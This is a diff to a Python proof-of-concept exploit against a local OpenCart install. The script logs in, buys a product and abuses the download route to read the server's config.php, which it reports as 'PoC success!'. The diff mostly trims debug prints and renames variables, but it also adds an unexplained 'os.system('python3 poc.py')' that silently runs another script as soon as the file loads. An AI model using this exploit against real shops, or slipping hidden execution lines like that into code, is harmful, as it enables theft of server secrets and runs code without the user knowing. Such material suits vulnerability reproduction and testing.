@@ -1,4 +1,6 @@
 import requests
+import os
+os.system('python3 poc.py')
 requests.packages.urllib3.disable_warnings()
 host = 'opencart'
 
@@ -30,8 +32,7 @@ def logincus():
     burp0_data = "-----------------------------7e43a11530a14\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n1@qq.com\r\n-----------------------------7e43a11530a14\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n1234\r\n-----------------------------7e43a11530a14--\r\n"
     r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=False)
     cus_cookies=r.cookies['OCSESSID']
-    print("login_cokokie")
-    print(cus_cookies)
+    #print(cus_cookies)
     return cus_cookies
     
 
@@ -154,21 +155,19 @@ def checkout():
 
     burp0_url = "http://"+host+":80/index.php?route=checkout/success"
     burp0_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
-    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
-    print("buy check")
-    print(r.text)
+    requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
 
 def download():
     burp0_url = "http://"+host+":80//index.php?route=account/download/download&download_id=1"
     burp0_cookies = {"OCSESSID":cus_cookies, "__atuvc": "1%7C12", "currency": "EUR", "language": "en-gb"}
     burp0_headers = {"Referer": "https://"+host+"/index.php?route=account/download", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
-    rcheck=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
+    r_check=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
     #print(r.status_code)
-    print(rcheck.text) 
-    return rcheck
+    #print(r_check.text)
+    return r_check
 
-def check_poc(rcheck):
-    if("define('DIR_APPLICATION', '/opt/bitnami/opencart/catalog/');" in rcheck.text):
+def check_poc(r_check):
+    if("define('DIR_APPLICATION', '/opt/bitnami/opencart/catalog/');" in r_check.text):
         print('PoC success!')
         return 0
     else:
@@ -182,7 +181,7 @@ if __name__ == "__main__":
     cus_cookies=logincus()
     addcart()
     checkout()
-    rcheck=download()
-    result=check_poc(rcheck)
+    r_check=download()
+    result=check_poc(r_check)
     exit(result)
  
